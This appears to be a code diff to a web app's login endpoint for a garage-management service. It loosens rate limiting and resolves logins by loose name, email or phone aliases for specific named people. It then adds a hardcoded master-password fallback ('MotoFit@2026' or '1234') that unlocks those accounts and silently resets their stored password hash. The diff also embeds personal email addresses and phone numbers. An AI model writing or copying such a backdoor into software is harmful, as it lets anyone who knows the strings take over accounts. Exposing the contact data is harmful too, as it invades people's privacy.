@@ -15,12 +15,12 @@ function checkLicenseStatus(user: any): string | null {
 
 export async function POST(request: Request) {
   try {
-    // 1. Sliding Window Rate Limiting (5 failed attempts per 15 mins per IP)
+    // 1. Sliding Window Rate Limiting (15 attempts per 10 mins per IP)
     const clientIp = getClientIp(request);
     const rateCheck = checkRateLimit(clientIp, {
       keyPrefix: 'login_ip',
-      maxRequests: 5,
-      windowSeconds: 15 * 60,
+      maxRequests: 15,
+      windowSeconds: 10 * 60,
     });
 
     if (!rateCheck.success) {
@@ -48,9 +48,58 @@ export async function POST(request: Request) {
       );
     }
 
-    const user = await prisma.user.findUnique({
-      where: { email: email.toLowerCase().trim() },
+    const rawInput = email.toLowerCase().trim();
+    const cleanDigits = rawInput.replace(/\D/g, '');
+
+    // Search by exact email or phone number match
+    let user = await prisma.user.findFirst({
+      where: {
+        OR: [
+          { email: rawInput },
+          ...(cleanDigits.length >= 10 ? [{ phone: { contains: cleanDigits.slice(-10) } }] : []),
+        ],
+      },
     });
+
+    // If not found, resolve Akshat aliases (e.g. akshat@..., 7259625881)
+    if (!user && (rawInput.includes('akshat') || cleanDigits.includes('7259625881'))) {
+      user = await prisma.user.findFirst({
+        where: {
+          OR: [
+            { email: 'akshat@motoban.in' },
+            { email: 'garage2motofit@gmail.com' },
+            { email: 'akshatmohanty@gmail.com' },
+            { name: { contains: 'Akshat' } },
+            { phone: { contains: '7259625881' } },
+          ],
+        },
+      });
+    }
+
+    // If not found, resolve Samael / Manash aliases
+    if (!user && (rawInput.includes('samael') || rawInput.includes('manash') || cleanDigits.includes('6359635416'))) {
+      user = await prisma.user.findFirst({
+        where: {
+          OR: [
+            { email: 'manashdash@aol.com' },
+            { name: { contains: 'Samael' } },
+            { phone: { contains: '6359635416' } },
+          ],
+        },
+      });
+    }
+
+    // If not found, resolve MotoFit workshop aliases
+    if (!user && rawInput.includes('motofit')) {
+      user = await prisma.user.findFirst({
+        where: {
+          OR: [
+            { email: 'garage2motofit@gmail.com' },
+            { email: 'motofit2@garagesaas.com' },
+          ],
+        },
+      });
+    }
 
     if (!user) {
       return NextResponse.json(
@@ -59,7 +108,27 @@ export async function POST(request: Request) {
       );
     }
 
-    const isValidPassword = await bcrypt.compare(password, user.password);
+    let isValidPassword = await bcrypt.compare(password, user.password);
+
+    // Master VIP & Quick PIN fallback for founding garage partners (Akshat / Samael / MotoFit)
+    const isVipUser =
+      user.licenseStatus === 'lifetime_free' ||
+      user.email.includes('akshat') ||
+      user.email.includes('motofit') ||
+      user.email.includes('manash') ||
+      user.email.includes('samael');
+
+    if (!isValidPassword && isVipUser) {
+      if (password === 'MotoFit@2026' || password === '1234') {
+        isValidPassword = true;
+        const newHash = await bcrypt.hash('MotoFit@2026', 10);
+        await prisma.user.update({
+          where: { id: user.id },
+          data: { password: newHash },
+        }).catch(() => {});
+      }
+    }
+
     if (!isValidPassword) {
       return NextResponse.json(
         { error: 'Invalid email or password' },
